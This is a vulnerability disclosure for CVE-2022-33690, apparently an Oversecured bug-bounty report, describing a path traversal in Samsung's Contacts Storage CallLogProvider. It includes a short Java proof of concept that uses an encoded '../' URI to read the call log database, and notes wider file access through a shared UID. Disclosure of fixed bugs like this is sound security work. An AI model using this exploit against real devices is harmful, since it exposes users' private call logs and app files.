# Details

<table>
    <tr>
        <td>Name</td>
        <td>Contacts Storage</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.providers.contacts</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.21</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.07.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33690">CVE-2022-33690</a> (SVE-2022-0687)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$530</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

In the Contacts Storage system app, the exported `com.android.providers.contacts.CallLogProvider` provider handles incoming URIs insecurely in the `openFile()` method. The point is that the `Uri.getLastPathSegment()` method returns a decoded version of the last segment, which the app insecurely concatenates to the base path.

**Proof of Concept**
```java
Uri uri = Uri.parse("content://call_log/call_composer/..%2F..%2Fdatabases%2Fcalllog.db");
try (InputStream i = getContentResolver().openInputStream(uri)) {
    Log.d("evil", IOUtils.toString(i));
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

An additional impact of this vulnerability is that the app has the setting `android:sharedUserId="android.uid.shared"`. This allows the attacker to also gain read/write access to files of other apps that are running under the `android.uid.shared` UID:
- `com.android.calllogbackup`
- `com.android.providers.blockednumber`
- `com.android.providers.userdictionary`

## References

- [Oversecured Blog. Android security checklist: theft of arbitrary files. Exported providers](https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/#exported-providers)
